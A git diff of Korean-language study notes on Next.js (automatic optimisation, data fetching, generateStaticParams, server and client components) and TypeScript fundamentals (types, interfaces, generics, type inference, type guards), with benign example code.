+2. 자동화된 최적화 기능 제공
+
+   - 자동 코드 스플리팅: 페이지 단위로 청크 분리 → 초기 로딩 최적화
+
+     - 예시
+
+       - 1. pages/about.tsx → about.js라는 별도의 청크 파일로 빌드됨.
+
+       - 2. 사용자가 / 페이지를 방문할 때는 about.js는 로드되지 않음.
+
+       - 3. 사용자가 about 페이지로 이동할 때 해당 코드 청크가 그때서야 로딩됨 → Lazy Loading
+
+   - 파일 기반 자동 라우팅: 디렉토리 구조만으로 라우팅 구성 가능
+
+   - 폰트 및 이미지 자동 최적화: next/image로 크기, 포맷(WebP), image lazy loading 자동 처리 및 next/font으로 Google Fonts, Local Fonts 등을 빌드 타임에 자동으로 최적화
+
+   - 프리 렌더링 및 프리 페칭: 기본적으로 빌드 타임에 필요한 페이지를 미리 생성하는 프리 렌더링 지원. 또한 `<Link>` 컴포넌트가 뷰포트에 진입하면 자동 프리 페치 → 빠른 페이지 전환
+
+3. 성능 최적화 & SEO 유리
+
+   - 프리 렌더링(SSG, SSR)으로 초기 페이지 로딩 속도 향상
+
+   - HTML이 완성된 형태로 제공되기 때문에 검색 엔진 최적화(SEO)에 매우 유리
+
+   - 코드 분할, 이미지 최적화, 폰트 최적화, 프리 페치 등으로 실제 사용자에게 빠른 체감 속도 제공
+
+4. 개발 생산성 향상
+
+   - API Routes: pages/api 디렉토리로 간단한 서버리스 백엔드 구현 가능
+
+   - 환경변수, 국제화(i18n), TypeScript 통합 등 기본 제공
+
+   - App Router, Middleware, React 최신 기능과 빠르게 연동 가능
 
 <br>
 
@@ -7543,9 +7602,7 @@ react 18에서 useTransition, useDeferredValue 두 가지 hook이 추가되었�
 
 <br>
 
-### # **getStaticProps, getStaticPath, getInitialProps, getServerSideProps**
-
-<br>
+### # getStaticProps, getStaticPath, getInitialProps, getServerSideProps
 
 - getStaticProps
 
@@ -7554,8 +7611,6 @@ react 18에서 useTransition, useDeferredValue 두 가지 hook이 추가되었�
   SSG와 ISR을 나누는 기준은 return 객체의 revalidate 옵션이며 revalidate 없다면 SSG로 동작하여 빌드 시 딱 한번만 호출된다는 특징이 있다. 단, 데이터 업데이트를 위해서는 재빌드 및 배포가 필요하다는 단점이 있다.
 
   revalidate가 존재하면 ISR로 동작하며 revalidate의 value 값에 따라 특정 주기마다 Next.js의 백그라운드에서 정적 페이지를 재생성한다. 만약 재생성 실패 시 기존 정적 페이지를 제공한다.
-
-<br>
 
 - getStaticPath
 
@@ -7654,7 +7709,7 @@ react 18에서 useTransition, useDeferredValue 두 가지 hook이 추가되었�
 
 <br>
 
-### # **Next.js의 환경 변수**
+### # Next.js의 환경 변수
 
 <br>
 
@@ -7716,6 +7771,31 @@ app -> outer -> inner 컴포넌트가 있다. 그리고 각 컴포넌트 내부�
   - getServerSideProps : fetch(URL, { cache: 'no-store' });
 
   - getStaticProps + revalidate : fetch(URL, { next: { revalidate: 10 } });
+
+  - getStaticPath : generateStaticParams
+
+    ```jsx
+    // app/products/[id]/page.tsx
+    // ✅ 여기에 선언해야 함 (컴포넌트 함수 바깥)
+    export const dynamicParams = false; // 과거 fallback 속성, blocking의 경우 'force-dynamic'로 설정
+
+    // 1. 프리빌드할 목록 지정
+    export async function generateStaticParams() {
+      return [{ id: "1" }, { id: "2" }];
+    }
+
+    // 2. 실제 페이지 렌더링
+    export default async function ProductPage({
+      params,
+    }: {
+      params: { id: string },
+    }) {
+      const product = await getProductById(params.id);
+      return <div>{product.name}</div>;
+    }
+    ```
+
+<br>
 
 ### # NextJs - 코딩앙마 강좌 2022.08.14
 
@@ -7846,6 +7926,16 @@ export default function handler(req, res) {
 
 ### # 클라이언트 컴포넌트와 서버 컴포넌트
 
+- 클라이언트 컴포넌트와 서버 컴포넌트로 나뉜 이유
+
+  | 기존 문제                       | 해결 방식 (RSC)                                         |
+  | ------------------------------- | ------------------------------------------------------- |
+  | 중첩 fetch 지연 (waterfall)     | 서버에서 직접 빠르게 fetch                              |
+  | 클라이언트로 쓸데없는 코드 전송 | 서버에서만 실행되므로 번들에서 제외됨                   |
+  | 서버와 클라이언트 코드 뒤섞임   | 명확한 `use client` / `use server` 선언으로 관심사 분리 |
+  | 페이지 단위 SSR만 가능          | 컴포넌트 단위 SSR 가능                                  |
+  | 클라이언트가 DB 접근 불가       | 서버 컴포넌트가 DB 직접 접근                            |
+
 - 클라이언트 컴포넌트
 
   - 역할
@@ -7866,11 +7956,15 @@ export default function handler(req, res) {
 
     - 브라우저 API를 사용할 때
 
+  - 사용 방법
+
+    - 최상단 'use client' 표시
+
 - 서버 컴포넌트
 
   - 역할
 
-    - JS 번들에 포함되지 않음, 클라이언트에 정적인 HTML만 전달
+    - 제로 번들 사이즈 컴포넌트, 즉 JS 번들에 포함되지 않음. 클라이언트에 정적인 HTML만 전달
 
     - 서버에서 데이터 fetching을 처리하여, API나 데이터베이스와 연결하고, 서버에서 데이터를 미리 가져와 HTML을 생성
 
@@ -7880,21 +7974,33 @@ export default function handler(req, res) {
 
     - 서버 측
 
-      1.  서버에서 서버 컴포넌트를 렌더링하여 RSC Payload 생성
+      1. 서버에서 서버 컴포넌트를 렌더링하여 직렬화한 RSC Payload 생성
 
-      - RSC Payload: RSC payload는 서버 컴포넌트의 렌더링 결과, 플레이스홀더 (클라이언트 컴포넌트의 렌더링 되는 위치에 대한 빈자리 표시와 필요한 js 파일에 대한 참조), 서버 컴포넌트가 클라이언트 컴포넌트에 전달하는 props를 가지고 있다.
+         - RSC Payload에 포함되는 정보
 
-      2. nextjs 서버에서는 해당 rsc payload와 클라이언트 컴포넌트 자바스크립트 인스트럭션(최소한의 js, 예를 들면 state의 초기 값)을 조합하여 정적인 HTML을 생성한다. 여기까지가 서버에서의 동작이다.
+           - 서버 컴포넌트의 JSX 렌더링 결과 (HTML이 아니라 직렬화된 데이터)
+
+           - 클라이언트 컴포넌트가 리액트 컴포넌트 트리 내에 들어갈 위치를 표시하는 placeholder (서버 컴포넌트는 클라이언트 컴포넌트를 포함이 가능하므로, 해당 클라이언트 컴포넌트와 그에 필요한 자원을 응답받아야 하기 때문에 이를 기억)
+
+           - 서버 컴포넌트가 클라이언트 컴포넌트에 넘기는 props 정보
+
+      2. RSC Payload + 클라이언트 컴포넌트 자바스크립트 인스트럭션(최소한의 js, 예를 들면 state의 초기 값)을 조합하여 정적인 HTML을 생성
 
     - 클라이언트 측
 
       3. 서버에서 생성한 HTML을 전달받아 즉시 보여준다. 다만 초기 라우팅, 즉 서버 사이드 라우팅인 경우만 이 HTML을 활용한다. 이후 클라이언트 사이드 라우팅인 경우에는 활용하지 않는다.
 
-      4. 클라이언트 컴포넌트가 포함되어 있다면 재조정(reconcile) 및 하이드레이션(수화)한다.
+      4. 서버 컴포넌트 내 클라이언트 컴포넌트가 포함되어 있다면 RSC payload에 placeholder, props를 활용하여 재조정(reconcile) 및 하이드레이션(수화)한다.
 
-      - 클라이언트 컴포넌트와 서버 컴포넌트 트리를 구성하는데 이것이 리액트 컴포넌트 트리이며 이 리액트 컴포넌트 트리(버츄얼 돔)에서 클라이언트 컴포넌트 트리에 플레이스홀더를 RSC payload에 포함되어있는 플레이스홀더 정보를 활용하여 채워주는데 이 과정을 재조정이라고 한다.
+      - 클라이언트 컴포넌트와 서버 컴포넌트 트리를 구성하는데 이것이 리액트 컴포넌트 트리이며 이 리액트 컴포넌트 트리(버츄얼 돔)에서 클라이언트 컴포넌트 트리에 플레이스홀더를
+        RSC payload에 포함되어있는 플레이스홀더 정보를 활용하여 채워주는데 이 과정을 재조정이라고 한다.
 
-      - 재조정을 통해 버츄얼 돔 클라이언트 컴포넌트 트리에 빈자리를 채운 뒤 인터렉션이 가능하도록 하이드레이션(수화)한다. 하이드레이션 시에는 서버에서와 마찬가지로 클라이언트 컴포넌트 자바스크립트 인스트럭션을 활용하는데 다른 점은 정적인 최소한의 js가 아닌 setState나 이벤트 핸들러 등과 같이 동적인 자바스크립트 인스트럭션(해당 자바스크립트 인스트럭션은 웹팩을 통해 쪼개진 js 청크이다. 네트워크를 통해 클라이언트, 즉 브라우저에서 전달받는다.)을 활용해서 하이드레이션하여 정적인 HTML이 인터렉션이 가능하도록 한다. (JavaScript instructions로 클라이언트 컴포넌트만 hydration 한다)
+      - 재조정을 통해 버츄얼 돔 클라이언트 컴포넌트 트리에 빈자리를 채운 뒤 인터렉션이 가능하도록 하이드레이션(수화)한다. 하이드레이션 시에는 서버에서와 마찬가지로
+        클라이언트 컴포넌트 자바스크립트 인스트럭션을 활용하는데 다른 점은 정적인 최소한의 js가 아닌 setState나 이벤트 핸들러 등과 같이 동적인 자바스크립트
+        인스트럭션(해당 자바스크립트 인스트럭션은 웹팩을 통해 쪼개진 js 청크이다. 네트워크를 통해 클라이언트, 즉 브라우저에서 전달받는다.)을 활용해서
+        하이드레이션하여 정적인 HTML이 인터렉션이 가능하도록 한다. (JavaScript instructions로 클라이언트 컴포넌트만 hydration 한다)
+
+      - 리액트 컴포넌트 트리(가상 돔)는 서버 컴포넌트가 뼈대를 이루는데, 이 때 하이드레이션이 필요한 위치를 표시하기 위해 RSC Payload 내 정보를 활용한다고 이해했다.
 
   - 언제 사용하나?
 
@@ -7905,6 +8011,10 @@ export default function handler(req, res) {
     - SEO 최적화를 고려할 때
 
     - JS 번들 사이즈 최소화를 원할 때
+
+  - 사용 방법
+
+    - 기본적으로 서버 컴포넌트로 동작함, 혹은 최상단 'use server' 표시
 
 - 결론
 
@@ -8160,7 +8270,7 @@ nextjs에서는 데이터 패칭을 위해 내장 fetch API를 활용한다. (�
 
   Next.js는 fetch() 함수에 cache 및 next 옵션을 제공하여 캐싱 전략을 제어할 수 있다.​
 
-  - `cache: 'force-cache'`: 기본값으로, 빌드 시 데이터를 캐싱하여 정적 페이지를 생성합니다. (기존 getStaticProps와 유사)
+  - fetch `cache: 'force-cache'`: 기본값으로, 빌드 시 데이터를 캐싱하여 정적 페이지를 생성합니다. (기존 getStaticProps와 유사)
 
     ```jsx
     // app/page.tsx
@@ -8181,7 +8291,7 @@ nextjs에서는 데이터 패칭을 위해 내장 fetch API를 활용한다. (�
     }
     ```
 
-  - `cache: 'no-store'`: 매 요청마다 데이터를 새로 가져와 SSR을 구현합니다. (기존 getServerSideProps와 유사)
+  - fetch `cache: 'no-store'`: 매 요청마다 데이터를 새로 가져와 SSR을 구현합니다. (기존 getServerSideProps와 유사)
 
     ```jsx
     // app/page.tsx
@@ -8202,7 +8312,7 @@ nextjs에서는 데이터 패칭을 위해 내장 fetch API를 활용한다. (�
     }
     ```
 
-  - `next: { revalidate: N(시간) }`: ISR(Incremental Static Regeneration)을 구현하여 N초마다 데이터를 재검증합니다.​ (기존 getStaticProps + revalidate와 유사)
+  - fetch `next: { revalidate: N(시간) }`: ISR(Incremental Static Regeneration)을 구현하여 N초마다 데이터를 재검증합니다.​ (기존 getStaticProps + revalidate와 유사)
 
     ```jsx
     // app/blog/[id]/page.tsx
@@ -8226,6 +8336,29 @@ nextjs에서는 데이터 패칭을 위해 내장 fetch API를 활용한다. (�
       );
     }
     ```
+
+- generateStaticParams : 동적 라우팅 시 프리렌더링을 목적으로 사용된다. (기존 getStaticPath와 유사)
+
+  ```jsx
+  // app/products/[id]/page.tsx
+  // ✅ 여기에 선언해야 함 (컴포넌트 함수 바깥)
+  export const dynamicParams = false; // 과거 fallback 속성, blocking의 경우 'force-dynamic'로 설정
+
+  // 1. 프리빌드할 목록 지정
+  export async function generateStaticParams() {
+    return [{ id: "1" }, { id: "2" }];
+  }
+
+  // 2. 실제 페이지 렌더링
+  export default async function ProductPage({
+    params,
+  }: {
+    params: { id: string },
+  }) {
+    const product = await getProductById(params.id);
+    return <div>{product.name}</div>;
+  }
+  ```
 
 - Request Memoization
 
@@ -8263,75 +8396,73 @@ nextjs에서는 데이터 패칭을 위해 내장 fetch API를 활용한다. (�
 
 ### # 타입스크립트 기본 타입
 
-<br>
+1. String : 문자열
 
-(1) String : 문자열
+   ```ts
+   let str: string = "hi";
+   ```
 
-```ts
-let str: string = "hi";
-```
+2. Number : 숫자
 
-(2) Number : 숫자
+   ```ts
+   let num: number = 10;
+   ```
 
-```ts
-let num: number = 10;
-```
+3. Boolean : 진위 값
 
-(3) Boolean : 진위 값
+   ```ts
+   let isLoggedIn: boolean = false;
+   ```
 
-```ts
-let isLoggedIn: boolean = false;
-```
+4. Array : 배열
 
-(4) Array : 배열
+   ```ts
+   let arr: number[] = [1, 2, 3];
+   let arr: Array<number> = [1, 2, 3]; // 제네릭 사용
+   ```
 
-```ts
-let arr: number[] = [1, 2, 3];
-let arr: Array<number> = [1, 2, 3]; // 제네릭 사용
-```
+5. Tuple : 고정 된 길이와 각 요소의 타입이 지정되어 있는 배열, 만약 정의하지 않은 타입, 인덱스로 접근할 경우 오류 발생
 
-(5) Tuple : 고정 된 길이와 각 요소의 타입이 지정되어 있는 배열, 만약 정의하지 않은 타입, 인덱스로 접근할 경우 오류 발생
+   ```ts
+   let arr: [string, number] = ["hi", 10];
+   arr[1].concat("!"); // 에러
+   arr[5] = "hello"; // 에러
+   ```
 
-```ts
-let arr: [string, number] = ["hi", 10];
-arr[1].concat("!"); // 에러
-arr[5] = "hello"; // 에러
-```
+6. Enum : 특정 값(상수)들의 집합, 인덱스 번호로도 접근할 수 있고 다른 문자열로 지정할 수도 있다. 일반 객체와 차이점은 수정이 불가하다.
 
-(6) Enum : 특정 값(상수)들의 집합, 인덱스 번호로도 접근할 수 있고 인덱스를 지정할 수도 있다. 일반 객체와 차이점은 수정이 불가하다.
+   ```ts
+   enum Avengers {
+     Capt = 2,
+     IronMan,
+     Thor,
+   }
+   let hero: Avengers = Avengers[2]; // Capt
+   let hero: Avengers = Avengers[4]; // Thor, IronMan과 Thor에 자동으로 인덱스 번호가 부여된다.
+   ```
 
-```ts
-enum Avengers {
-  Capt = 2,
-  IronMan,
-  Thor,
-}
-let hero: Avengers = Avengers[2]; // Capt
-let hero: Avengers = Avengers[4]; // Thor, IronMan과 Thor에 자동으로 인덱스 번호가 부여된다.
-```
+7. Any : 모든 타입에 대해서 허용
 
-(7) Any : 모든 타입에 대해서 허용
+   ```ts
+   let str: any = "hi";
+   let num: any = 10;
+   let arr: any = ["a", 2, true];
+   ```
 
-```ts
-let str: any = "hi";
-let num: any = 10;
-let arr: any = ["a", 2, true];
-```
+8. Void : 변수에 사용 시 undefined와 null만 할당을 허용하고, 함수에 사용 시 반환 값이 없다는 것을 의미하는 타입
 
-(8) Void : 변수에 사용 시 undefined와 null만 할당을 허용하고, 함수에 사용 시 반환 값이 없다는 것을 의미하는 타입
+   ```ts
+   let unuseful: void = undefined;
+   function notuse(): void {
+     console.log("sth");
+   }
+   ```
 
-```ts
-let unuseful: void = undefined;
-function notuse(): void {
-  console.log("sth");
-}
-```
+9. Null
 
-(9) Null
+10. Undefined
 
-(10) Undefined
-
-(11) Never : 함수의 끝에 절대 도달하지 않는다는 의미를 지닌 타입, 예시로 무한 루프를 발생시키는 함수나 항상 에러를 반환하는 함수의 출력 값으로 지정할 수 있다. void와의 차이점은 void는 null 혹은 undefined 값의 반환을 허용한다는 것이고 never는 never 이외에는 허용하지 않는다.
+11. Never : 함수의 끝에 절대 도달하지 않는다는 의미를 지닌 타입, 예시로 무한 루프를 발생시키는 함수나 항상 에러를 반환하는 함수의 출력 값으로 지정할 수 있다. void와의 차이점은 void는 null 혹은 undefined 값의 반환을 허용한다는 것이고 never는 never 이외에는 허용하지 않는다.
 
 ```ts
 // 항상 오류 발생
@@ -8351,8 +8482,6 @@ function infiniteAnimate(): never {
 
 ### # 함수 타입
 
-<br>
-
 - 타입스크립트에서는 함수의 인자를 모두 필수 값으로 간주한다. 따라서, 함수의 매개변수를 설정하면 undefined나 null이라도 인자로 넘겨야하며 컴파일러에서 정의된 매개변수 값이 넘어 왔는지 확인한다. 달리 말하면 정의된 매개변수 값만 받을 수 있고 추가로 인자를 받을 수 없다는 의미이다.
 
   ```ts
@@ -8368,9 +8497,39 @@ function infiniteAnimate(): never {
 
 ### # 인터페이스 타입
 
-<br>
+- 여러 타입을 합쳐서 사용하는 타입, AND 연산자와 같이 모든 타입을 만족해야한다.
 
-- 여러타입을 합쳐서 사용하는 타입, AND 연산자와 같이 모든 타입을 만족해야한다. 하지만 옵션 속성을 활용하여 특정 타입을 옵셔널하게 사용할 수 있다. 또한 extends를 통해 확장도 가능하다.
+- 옵셔널(?) 속성을 활용하여 특정 타입을 옵셔널하게 사용할 수 있다.
+
+- extends 키워드를 사용해 기존 인터페이스를 확장(상속) 하여 새로운 인터페이스를 만들 수 있다.
+
+- 인터페이스끼리 합칠 때는 & (교차 타입, Intersection Type)를 사용하여 여러 타입을 동시에 만족하도록 할 수 있다.
+
+- 선언 병합이 가능하다.
+
+  ```ts
+  interface Person {
+    name: string;
+    age: number;
+  }
+
+  interface Employee {
+    employeeId: string;
+    department?: string; // 옵셔널 속성
+  }
+
+  // Person과 Employee 타입을 모두 만족하는 타입 만들기 (교차 타입)
+  type Staff = Person & Employee;
+
+  const staffMember: Staff = {
+    name: "Alice",
+    age: 30,
+    employeeId: "E123",
+    // department는 선택적이라 안 적어도 됨
+  };
+  ```
+
+- 기타 예시
 
   ```ts
   // 예제1: 기본 사용
@@ -8434,13 +8593,26 @@ function infiniteAnimate(): never {
   fe.name = "josh";
   fe.skill = "TypeScript";
   fe.drink = "Beer";
+
+  // 예제7: 선언 병합
+  interface Person {
+    name: string;
+  }
+
+  // 같은 이름의 인터페이스가 또 선언됐지만, 타입스크립트가 두 선언을 합쳐서 처리
+  interface Person {
+    age: number;
+  }
+
+  const p: Person = {
+    name: "Lee",
+    age: 30, // age 프로퍼티가 정상적으로 인식됨
+  };
   ```
 
 <br>
 
 ### # 클래스에서의 타입스크립트 활용
-
-<br>
 
 - readonly : 클래스의 속성에 readonly 키워드를 사용하면 아래와 같이 접근만 가능합니다.
 
@@ -8454,8 +8626,6 @@ function infiniteAnimate(): never {
   let john = new Developer("John");
   john.name = "John"; // error! name is readonly.
   ```
-
-<br>
 
 - Accessor : 타입스크립트는 객체의 특정 속성의 접근과 할당에 대해 제어할 수 있다.
 
@@ -8480,8 +8650,6 @@ function infiniteAnimate(): never {
   josh.name = "Josh Bolton"; // Error
   josh.name = "Josh";
   ```
-
-<br>
 
 - Abstract Class : 추상 클래스(Abstract Class)는 인터페이스와 비슷한 역할을 하면서도 조금 다른 특징을 갖고 있다. 추상 클래스는 특정 클래스의 상속 대상이 되는 클래스이며 좀 더 상위 레벨에서 속성, 메서드의 모양을 정의한다.
 
@@ -8513,11 +8681,9 @@ function infiniteAnimate(): never {
 
 ### # 제네릭(Generic) 타입
 
-<br>
-
 - 제네릭이란?
 
-  함수나 클래스의 재사용을 목적으로 선언 시점이 아닌 사용 시점에 타입을 선언하는 타입이다. 함수나 클래스에서 사용할 타입을 인수로 넘겨서 사용하는 개념이다.
+  함수, 클래스, 인터페이스 등에서 타입을 고정하지 않고 사용하는 시점에 타입을 외부로부터 주입받아 사용하는 문법이다.
 
   ```ts
   function getText<T>(text: T): T {
@@ -8529,50 +8695,52 @@ function infiniteAnimate(): never {
   getText<boolean>(true);
   ```
 
-<br>
+- 제네릭 타입의 제한 (제네릭 타입 프로퍼티 접근 시 문제점)
 
-- 제네릭 프로퍼티 체크
-
-  함수이 제네릭 타입 사용 시 함수 내부에서 파라미터의 관련 메소드 사용 시 에러가 발생할 수 있다. 이유는 제네릭 타입의 경우 파라미터의 프로퍼티 체크 시 타입의 범위가 넓은 경우 관령 메소드가 있다는 단서를 찾을 수 없기 때문이다. 그렇기 때문에 함수 내부에서 타입 가드나 파라미터의 명시적인 타입 선언을 통해서 타입 범위를 좁혀야한다.
+  제네릭 타입은 구체적인 타입이 정해지지 않았기 때문에, 타입에 따라 존재하지 않을 수도 있는 프로퍼티나 메서드에 접근하려고 하면 컴파일 에러가 발생한다. 그렇기 때문에 타입 가드 혹은 제네릭 타입에 제약(extends)를 걸어 타입 범위를 좁혀야한다.
 
   ```ts
-  // 에러 발생 : 명시적인 타입 미선언
+  // ❌ 에러: T 타입이 어떤 타입인지 알 수 없기 때문에 .length 사용 불가
   function logText<T>(text: T): T {
-    console.log(text.length); // Error: T doesn't have .length
+    console.log(text.length); // Error
     return text;
   }
 
-  // 에러 미발생 : 명시적인 타입 선언
+  // ✅ 제네릭 타입에 배열 제약을 걸면 length 사용 가능
   function logText<T>(text: T[]): T[] {
-    console.log(text.length); // 제네릭 타입이 배열이기 때문에 `length`를 허용합니다.
+    console.log(text.length);
+    return text;
+  }
+
+  // ✅ 제네릭에 string을 확장한 제약을 걸면 .length 사용 가능
+  function logText<T extends { length: number }>(text: T): T {
+    console.log(text.length);
     return text;
   }
   ```
-
-<br>
 
 - 제네릭 인터페이스
 
   ```ts
-  // 변형 전
-  function logText<T>(text: T): T {
-    return text;
-  }
-
-  let str: <T>(text: T) => T = logText; // #1
-  let str: { <T>(text: T): T } = logText; // #2
-
-  // 변형 후
+  // 함수 자체에 제네릭 정의
   interface GenericLogTextFn {
     <T>(text: T): T;
   }
+
   function logText<T>(text: T): T {
     return text;
   }
-  let myString: GenericLogTextFn = logText; // Okay
+
+  let myString: GenericLogTextFn = logText; // OK
   ```
 
-<br>
+  ```ts
+  interface GenericLogTextFn<T> {
+    (text: T): T;
+  }
+
+  const logText: GenericLogTextFn<string> = (text) => text;
+  ```
 
 - 제네릭 클래스
 
@@ -8580,201 +8748,255 @@ function infiniteAnimate(): never {
   class GenericMath<T> {
     pi: T;
     sum: (x: T, y: T) => T;
+
+    constructor(pi: T, sum: (x: T, y: T) => T) {
+      this.pi = pi;
+      this.sum = sum;
+    }
   }
 
-  let math = new GenericMath<number>();
+  const math = new GenericMath<number>(3.14, (a, b) => a + b);
   ```
 
 <br>
 
 ### # 타입 추론
 
-<br>
-
 - 타입 추론이란?
 
-  타입 추론이란 타입을 따로 정의하지 않아도 자동으로 타입을 추론해주는 기능을 말한다. 정적 타입 언어의 단점은 타입을 정의하는데 많은 시간과 노력이 들기 때문에 생산성이 저하될 수 있다는 점이다. 하지만 타입스크립트의 경우 타입 추론을 제공하기 때문에 필요한 경우에만 타입 정의를 할 수 있어 코드를 덜 작성하면서도 같은 수준의 타입 안정성을 유지할 수 있다. 타입 추론은 몇 개의 표현식을 참고하여 최적의 공통 타입(베스트 커먼 타입 알고리즘)을 추론하거나 코드가 작성되는 흐름을 기반으로 타입(문맥상의 타이핑)을 추론한다.
-
-<br>
+  타입 추론이란 타입을 따로 정의하지 않아도 자동으로 타입을 추론해주는 기능을 말한다. 정적 타입 언어의 단점은 타입을 정의하는데 많은 시간과 노력이 들기 때문에 생산성이 저하될 수 있다는 점이다.
+  하지만 타입스크립트의 경우 타입 추론을 제공하기 때문에 필요한 경우에만 타입 정의를 할 수 있어 코드를 덜 작성하면서도 같은 수준의 타입 안정성을 유지할 수 있다. (but 명시적인 타입 선언이 안전하다)
+  타입 추론은 몇 개의 표현식을 참고하여 최적의 공통 타입(베스트 커먼 타입 알고리즘)을 추론하거나 코드가 작성되는 흐름을 기반으로 타입(문맥상의 타이핑)을 추론한다.
 
 - 타입스크립트의 타입 추론 방법
 
-  (1) 최적의 공통 타입(Best Common Type) : 타입은 보통 몇 개의 표현식(코드)을 바탕으로 타입을 추론한다. 그리고 그 표현식을 이용하여 가장 근접한 타입을 추론하게 되는데 이 가장 근접한 타입을 Best Common Type(최적의 공통 타입)이라고 한다. Best Common Type 알고리즘으로 다른 타입들과 가장 잘 호환되는 타입을 선정한다.
+  1. 최적의 공통 타입(Best Common Type)
 
-  ```ts
-  let x = [0, 1, null]; // let x: (number | null)[]
-  ```
+     여러 표현식이 동시에 존재하는 경우, 모든 표현식에 공통으로 적용 가능한 가장 일반적인 타입을 찾아서 추론한다.
 
-  (2) 문맥상의 타이핑(Contextual Typing) : 문맥상의 타이핑(타입 결정)은 코드의 위치(문맥)를 기준으로 일어난다.
+     ```ts
+     let x = [0, 1, null]; // let x: (number | null)[]
+     ```
 
-  ```ts
-  // 예제1 : Window.onmousedown 함수의 타입을 사용하여 오른쪽에 할당된 함수 표현식의 타입을 추론하고 mouseEvent의 프로퍼티가 아닌 kangaroo는 에러가 발생한다.
-  window.onmousedown = function (mouseEvent) {
-    console.log(mouseEvent.button); //<- OK
-    console.log(mouseEvent.kangaroo); //<- Error!
-  };
+  2. 문맥상의 타이핑(Contextual Typing)
 
-  // 예제2 : 변수에 할당되므로 함수가 명시적으로 any타입으로 추론되기 때문에 오류가 발생하지 않는다.
-  const handler = function (uiEvent) {
-    console.log(uiEvent.button); //<- OK
-  };
-  ```
+     문맥상의 타이핑(타입 결정)은 코드의 위치(문맥)를 기준으로 일어난다.
+
+     ```ts
+     // 예제1 : Window.onmousedown 함수의 타입을 사용하여 오른쪽에 할당된 함수 표현식의 타입을 추론하고 mouseEvent의 프로퍼티가 아닌 kangaroo는 에러가 발생한다.
+     window.onmousedown = function (mouseEvent) {
+       console.log(mouseEvent.button); //<- OK
+       console.log(mouseEvent.kangaroo); //<- Error!
+     };
+
+     // 예제2 : 변수에 할당되므로 함수가 명시적으로 any타입으로 추론되기 때문에 오류가 발생하지 않는다.
+     const handler = function (uiEvent) {
+       console.log(uiEvent.button); //<- OK
+     };
+     ```
 
 <br>
 
 ### # 타입 가드
 
-<br>
+- 타입 가드란?
 
-- 타입 가드는 타입의 범위가 넓을 때 컴파일러가 타입을 예측할 수 있도록 타입의 범위를 축소시키는 것을 말한다. as를 사용한 타입 단언(A as number), if문과 typeof 연산자 활용(typeof A === "number"), if문과 in 연산자 활용("toString" in A) 등을 활용하여 타입 가드를 적용시킬 수 있다.
+  타입 가드는 타입의 범위가 넓을 때 컴파일러가 타입을 추론할 수 있도록 타입의 범위를 축소시키는 것을 말한다.
 
-  ```ts
-  // 방법1: as(타입 단언)을 활용
-  function someFunc(val: string | number, isNumber: boolean) {
-    if (isNumber) {
-      (val as number).toFixed(2);
-      isNaN(val as number);
-    } else {
-      (val as string).split("");
-      (val as string).toUpperCase();
-      (val as string).length;
+- 타입 가드 방법
+
+  - 1. typeof 활용
+
+    ```ts
+    function printValue(value: string | number) {
+      if (typeof value === "string") {
+        console.log(value.toUpperCase()); // value는 string으로 좁혀짐
+      } else {
+        console.log(value.toFixed(2)); // value는 number로 좁혀짐
+      }
     }
-  }
+    ```
 
-  // 방법2: typeof 활용
-  function someFuncTypeof(val: string | number) {
-    if (typeof val === "number") {
-      val.toFixed(2);
-      isNaN(val);
-    } else {
-      val.split("");
-      val.toUpperCase();
-      val.length;
+  - 2. instanceof 활용
+
+    ```ts
+    class Dog {
+      bark() {
+        console.log("멍멍!");
+      }
     }
-  }
 
-  // 방법3: in연산자 활용
-  function someFuncIn(val: any) {
-    if ("toFixed" in val) {
-      val.toFixed(2);
-      isNaN(val);
-    } else if ("split" in val) {
-      val.split("");
-      val.toUpperCase();
-      val.length;
+    class Cat {
+      meow() {
+        console.log("야옹!");
+      }
     }
-  }
 
-  // 방법4: instanceof연산자 활용
-  class Cat {
-    meow() {}
-  }
-  class Dog {
-    woof() {}
-  }
-  function sounds(ani: Cat | Dog) {
-    if (ani instanceof Cat) {
-      ani.meow();
-    } else {
-      ani.woof();
+    function speak(animal: Dog | Cat) {
+      if (animal instanceof Dog) {
+        animal.bark(); // Dog로 좁혀짐
+      } else {
+        animal.meow(); // Cat으로 좁혀짐
+      }
     }
-  }
-  ```
+    ```
 
-<br>
+  - 3. in 연산자 활용
+
+    ```ts
+    type Developer = { name: string; skill: string };
+    type Designer = { name: string; tool: string };
+
+    function introduce(person: Developer | Designer) {
+      if ("skill" in person) {
+        console.log(
+          `${person.name}는 개발자입니다. 사용하는 기술은 ${person.skill}`
+        );
+      } else {
+        console.log(
+          `${person.name}는 디자이너입니다. 사용하는 도구는 ${person.tool}`
+        );
+      }
+    }
+    ```
+
+  - 4. 사용자 정의 커스텀
+
+    ```ts
+    // pet is Fish 형태의 반환 타입이 핵심. 이게 사용자 정의 타입 가드
+    // x is Y 문법 : 조건을 만족하면 타입스크립트가 자동으로 타입 좁힘, as 보다 안전하다. 조건에 부합하지 않는 경우 타입을 좁히지 않음.
+    type Fish = { swim: () => void };
+    type Bird = { fly: () => void };
+
+    function isFish(pet: Fish | Bird): pet is Fish {
+      return (pet as Fish).swim !== undefined;
+    }
+
+    function move(pet: Fish | Bird) {
+      if (isFish(pet)) {
+        pet.swim(); // pet은 Fish로 좁혀짐
+      } else {
+        pet.fly(); // pet은 Bird로 좁혀짐
+      }
+    }
+    ```
+
+  - 5. 타입 단언 활용
+
+    ```ts
+    // 방법1: as(타입 단언)을 활용
+    function someFunc(val: string | number, isNumber: boolean) {
+      if (isNumber) {
+        (val as number).toFixed(2);
+        isNaN(val as number);
+      } else {
+        (val as string).split("");
+        (val as string).toUpperCase();
+        (val as string).length;
+      }
+    }
+    ```
 
 ### # 타입 단언
 
-<br>
+- 타입 단언이란?
 
-- 타입 단언은 타입을 강제적으로 지정해줄 떄 사용하며 as 키워드를 통해 타입 단언을 할 수 있다. 타입 추론보다 더 정확한 타입을 아는 경우에 사용할 수 있다. 주의할 점은 런타임 에러가 절대 발생하지 않을 것이라는 확신이 있을 때만 사용해야한다. 예를 들어 var a, a = 20, var b = a와 같은 순서로 변수 값을 복사할 때 b 변수는 a 변수가 생성될 때의 타입인 any 타입을 가지게 된다. 이러한 경우 타입 단언을 사용할 수 있다. 또한 타입 단언은 DOM API 조작 시에도 많이 사용된다. DOM API로 이미 존재하는 DOM에 접근 시 엘리먼트 타입과 null을 포함한 유니온 타입으로 추론되는데 이 때 타입 단언을 통해 엘리먼트 타입으로 지정하여 null인 경우에 예외처리를 생략할 수 있다.
